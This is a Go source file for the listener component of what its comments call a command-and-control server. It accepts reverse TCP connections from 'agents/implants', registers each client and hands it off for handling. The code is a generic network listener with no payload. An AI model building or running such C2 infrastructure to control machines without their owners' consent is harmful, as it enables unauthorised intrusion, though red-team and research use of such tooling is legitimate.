package network

import (
	"backend/models"
	"backend/utils"
	"fmt"
	"log"
	"net"
	"sync"
	"time"
)

// =====================================================
//   Reverse TCP Listener (C2 Inbound Client Connector)
// =====================================================
//
// This component listens for *incoming* agent/implant connections.
// Clients connect back to the server (reverse TCP). Each accepted
// connection is wrapped in a Client struct and handled asynchronously.
//
// The listener state is protected by a mutex so the UI / API can query
// whether the server is currently listening.

var (
	// isListening indicates whether the TCP listener is currently active.
	isListening bool

	// listenerMutex protects isListening and currentPort.
	listenerMutex sync.Mutex

	// currentPort stores the port number currently being listened on.
	currentPort int
)

// StartReverseTCPListener starts a TCP server on the given port and waits
// for reverse connections from clients/agents. Each client is assigned
// an ID and handled by handleClientConnection() in its own goroutine.
func StartReverseTCPListener(port int) {
	// Update listener state
	listenerMutex.Lock()
	isListening = true
	currentPort = port
	listenerMutex.Unlock()

	// When the function exits (normally or by error), reset state
	defer func() {
		listenerMutex.Lock()
		isListening = false
		currentPort = 0
		listenerMutex.Unlock()
	}()

	address := fmt.Sprintf("0.0.0.0:%d", port)

	// Attempt to bind the port
	listener, err := net.Listen("tcp", address)
	if err != nil {
		log.Printf("Failed to start listener: %v", err)
		return
	}
	defer listener.Close()

	log.Printf("C2 Server listening on port %d", port)

	// Accept incoming client connections indefinitely
	for {
		conn, err := listener.Accept()
		if err != nil {
			log.Printf("Accept error: %v", err)
			continue
		}

		// Extract connecting client's IP:port
		clientAddr := conn.RemoteAddr().String()

		// Create and store new client object
		client := &models.Client{
			ID:        utils.GenerateClientID(),        // Random C2-assigned unique ID
			Conn:      conn,                            // Raw TCP connection
			LastSeen:  time.Now(),                      // Last activity timestamp
			IPAddress: clientAddr,                      // Remote address string
			IsActive:  true,                            // Mark as active
			Messages:  make([]models.ClientMessage, 0), // Store recent inbound messages
		}

		log.Printf("New client connected: %s from %s", client.ID, clientAddr)

		// Save in global client registry
		AddClient(clientAddr, client)

		// Spawn dedicated goroutine to handle binary protocol for this client
		go handleClientConnection(client)
	}
}

// IsListening returns whether the listener is currently active.
// Protected by a mutex to avoid race conditions in UI or API calls.
func IsListening() bool {
	listenerMutex.Lock()
	defer listenerMutex.Unlock()
	return isListening
}
